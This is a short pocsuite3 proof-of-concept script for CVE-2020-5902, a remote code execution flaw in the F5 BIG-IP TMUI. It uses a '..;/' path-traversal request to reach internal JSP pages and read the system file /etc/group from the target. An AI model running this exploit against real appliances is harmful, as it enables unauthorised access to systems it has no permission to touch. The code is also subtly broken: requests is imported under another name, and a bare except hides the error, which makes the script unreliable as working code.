from urllib.parse import urlparse
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = ''
    references = ['']
    name = 'BIG-IP TMUI RCE'
    appPowerLink = ''
    appName = 'BIG-IP F5 CVE-2020-5902'
    appVersion = '11.6.x, 12.1.x, 13.1.x, 14.1.x, 15.0.x, 15.1.x'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = ''''''

    def _verify(self):
        result = {}
        test = self.url + "/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=test5902"
        try:
            r = requests.get(url=test,verify=False)
            # check fileRead.jsp
            if r.status_code == 200:                        
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = test
                
                target =  self.url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/group"
                r = requests.get(url=target,verify = False)
                if r.status_code == 200:
                    result['extra'] = {}
                    result['extra']['evidence'] = r.content.decode('utf-8').strip()
        except:
            pass
            

        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("not vulnerability")
        return output


register_poc(TestPOC)
